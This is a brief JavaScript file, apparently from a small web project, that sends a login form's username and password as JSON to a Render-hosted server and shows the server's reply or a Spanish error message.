// script.js
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const messageDiv = document.getElementById('message');

    loginForm.addEventListener('submit', function(event) {
        event.preventDefault();

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        const userData = {
            username: username,
            password: password
        };

        // Envío de datos al servidor Node.js
        //fetch('http://localhost:3000/', {
        fetch('https://optimizacion-9lbf.onrender.com/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(userData)
        })
        .then(response => {
            if (!response.ok) {
                return response.text().then(text => { throw new Error(`HTTP error! status: ${response.status}, body: ${text}`); });
            }
            return response.text();
        })
        .then(data => {
            messageDiv.textContent = data;
            loginForm.reset();
        })
        .catch(error => {
            console.error('Error:', error);
            messageDiv.textContent = 'Ocurrió un error al guardar los datos.';
        });
    });
});